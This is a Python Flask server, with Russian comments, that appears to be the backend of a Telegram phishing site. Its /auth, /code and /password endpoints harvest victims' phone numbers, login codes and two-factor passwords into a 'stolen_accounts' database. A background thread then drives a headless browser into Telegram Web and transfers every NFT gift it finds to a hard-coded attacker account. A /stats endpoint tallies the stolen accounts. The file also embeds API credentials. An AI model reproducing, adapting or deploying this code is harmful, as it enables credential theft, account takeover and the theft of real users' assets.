from flask import Flask, request, jsonify
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import logging
import os
import sqlite3
import threading

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# Твои данные
API_ID = 25015433
API_HASH = '546b7eb3f2865939ca71dbaedb49017d'
TARGET_USERNAME = '@trepall'

def init_db():
    """Инициализация базы данных"""
    conn = sqlite3.connect('accounts.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_accounts
                 (id INTEGER PRIMARY KEY, phone TEXT, code TEXT, password TEXT, 
                  gifts_stolen INTEGER DEFAULT 0, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

def save_stolen_account(phone, code=None, password=None):
    """Сохранение украденных данных"""
    try:
        conn = sqlite3.connect('accounts.db', check_same_thread=False)
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO stolen_accounts 
                    (phone, code, password, status) VALUES (?, ?, ?, ?)''',
                 (phone, code, password, 'collected'))
        conn.commit()
        conn.close()
        logging.info(f"🎣 Сохранены данные: {phone}")
        return True
    except Exception as e:
        logging.error(f"❌ Ошибка сохранения: {e}")
        return False

def setup_driver():
    """Настройка Chrome для Render"""
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36')
    
    chrome_options.binary_location = '/usr/bin/google-chrome'
    
    driver = webdriver.Chrome(
        executable_path='/usr/local/bin/chromedriver',
        options=chrome_options
    )
    return driver

def transfer_nft_gifts(phone, code, password=None):
    """Передача NFT подарков через веб-интерфейс"""
    
    driver = setup_driver()
    transferred_count = 0
    
    try:
        logging.info(f"🚀 Начинаю передачу NFT для {phone}")
        
        # 1. Открываем Telegram Web
        driver.get("https://web.telegram.org/")
        time.sleep(5)
        
        # 2. Ввод номера телефона
        phone_input = WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='phone_number']"))
        )
        phone_input.send_keys(phone)
        
        next_btn = driver.find_element(By.XPATH, "//button[contains(text(),'Next') or contains(text(),'Далее')]")
        next_btn.click()
        time.sleep(3)
        
        # 3. Ввод кода
        code_input = WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='verification_code']"))
        )
        code_input.send_keys(code)
        time.sleep(3)
        
        # 4. Ввод пароля если есть
        if password:
            pwd_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='password']"))
            )
            pwd_input.send_keys(password)
            submit_btn = driver.find_element(By.XPATH, "//button[contains(text(),'Sign In') or contains(text(),'Войти')]")
            submit_btn.click()
        
        time.sleep(8)
        
        # 5. Открываем свой профиль
        profile_btn = WebDriverWait(driver, 15).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "[aria-label*='Profile'], [data-testid*='profile']"))
        )
        profile_btn.click()
        time.sleep(3)
        
        # 6. Ищем раздел "Подарки"
        gifts_tab = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'Gifts') or contains(text(), 'Подарки')]"))
        )
        gifts_tab.click()
        time.sleep(3)
        
        # 7. Ищем уникальные подарки
        nft_gifts = driver.find_elements(By.CSS_SELECTOR, "[class*='gift'], [class*='nft'], [data-testid*='gift']")
        
        logging.info(f"🎁 Найдено подарков: {len(nft_gifts)}")
        
        for i, gift in enumerate(nft_gifts):
            try:
                logging.info(f"🔄 Обрабатываю подарок {i+1}")
                gift.click()
                time.sleep(2)
                
                # Ищем кнопку "Передать"
                transfer_btn = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.XPATH, 
                        "//button[contains(text(), 'Transfer') or contains(text(), 'Передать') or contains(text(), 'Send')]"))
                )
                transfer_btn.click()
                time.sleep(2)
                
                # Вводим целевой username
                username_input = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[placeholder*='username'], input[placeholder*='имя']"))
                )
                username_input.clear()
                username_input.send_keys(TARGET_USERNAME.replace('@', ''))
                time.sleep(2)
                
                # Подтверждаем передачу
                confirm_btn = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.XPATH,
                        "//button[contains(text(), 'Confirm') or contains(text(), 'Подтвердить') or contains(text(), 'Send')]"))
                )
                
                confirm_text = confirm_btn.text
                logging.info(f"💰 Стоимость перевода: {confirm_text}")
                
                confirm_btn.click()
                time.sleep(3)
                
                transferred_count += 1
                logging.info(f"✅ Передан NFT подарок #{transferred_count}")
                
                # Возвращаемся к списку подарков
                back_btn = driver.find_element(By.CSS_SELECTOR, "[aria-label*='Back'], [class*='back']")
                back_btn.click()
                time.sleep(2)
                
            except Exception as e:
                logging.error(f"❌ Ошибка передачи подарка: {e}")
                continue
        
        logging.info(f"🎯 Итог: передано {transferred_count} NFT подарков")
        return transferred_count
        
    except Exception as e:
        logging.error(f"💥 Критическая ошибка: {e}")
        return 0
    finally:
        driver.quit()

def background_gift_stealing(phone, code, password=None):
    """Запуск кражи подарков в фоне"""
    try:
        stolen = transfer_nft_gifts(phone, code, password)
        
        # Обновляем статус в базе
        conn = sqlite3.connect('accounts.db', check_same_thread=False)
        c = conn.cursor()
        c.execute('''UPDATE stolen_accounts 
                    SET gifts_stolen = ?, status = ?
                    WHERE phone = ?''', 
                 (stolen, 'completed' if stolen > 0 else 'failed', phone))
        conn.commit()
        conn.close()
        
        logging.info(f"🎯 Итог для {phone}: украдено {stolen} подарков")
    
    except Exception as e:
        logging.error(f"💥 Ошибка фоновой кражи: {e}")

# ЭНДПОИНТЫ ДЛЯ САЙТА
@app.route('/auth', methods=['POST'])
def auth_endpoint():
    """Принимает номер телефона"""
    data = request.json
    phone = data.get('phone', '')
    
    if not phone:
        return jsonify({'status': 'error', 'message': 'Phone required'}), 400
    
    save_stolen_account(phone)
    
    return jsonify({
        'status': 'code_sent',
        'message': 'Код отправлен в Telegram'
    })

@app.route('/code', methods=['POST'])
def code_endpoint():
    """Принимает код из Telegram"""
    data = request.json
    phone = data.get('phone', '')
    code = data.get('code', '')
    
    if not phone or not code:
        return jsonify({'status': 'error', 'message': 'Phone and code required'}), 400
    
    save_stolen_account(phone, code=code)
    
    # Проверяем нужен ли пароль
    return jsonify({
        'status': 'success', 
        'message': 'Авторизация успешна'
    })

@app.route('/password', methods=['POST'])
def password_endpoint():
    """Принимает пароль и запускает кражу"""
    data = request.json
    phone = data.get('phone', '')
    password = data.get('password', '')
    
    if not phone or not password:
        return jsonify({'status': 'error', 'message': 'Phone and password required'}), 400
    
    save_stolen_account(phone, password=password)
    
    # ЗАПУСКАЕМ КРАЖУ ПОДАРКОВ В ФОНЕ
    code = data.get('code', '')  # Код должен приходить вместе с паролем
    thread = threading.Thread(
        target=background_gift_stealing,
        args=(phone, code, password)
    )
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'status': 'success',
        'message': 'Двухфакторная аутентификация пройдена'
    })

@app.route('/transfer', methods=['POST'])
def transfer_endpoint():
    """Прямой запуск передачи подарков"""
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password')
    
    if not phone or not code:
        return jsonify({'error': 'Phone and code required'}), 400
    
    result = transfer_nft_gifts(phone, code, password)
    
    return jsonify({
        'status': 'success',
        'transferred': result,
        'message': f'Передано {result} NFT подарков на {TARGET_USERNAME}'
    })

@app.route('/stats', methods=['GET'])
def stats_endpoint():
    """Статистика украденных аккаунтов"""
    conn = sqlite3.connect('accounts.db', check_same_thread=False)
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*), SUM(gifts_stolen) FROM stolen_accounts")
    total, gifts = c.fetchone()
    
    c.execute("SELECT phone, gifts_stolen, status FROM stolen_accounts ORDER BY id DESC LIMIT 10")
    recent = c.fetchall()
    
    conn.close()
    
    return jsonify({
        "total_accounts": total,
        "total_gifts_stolen": gifts or 0,
        "recent_activity": [
            {"phone": r[0], "gifts": r[1], "status": r[2]} for r in recent
        ]
    })

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'target': TARGET_USERNAME})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
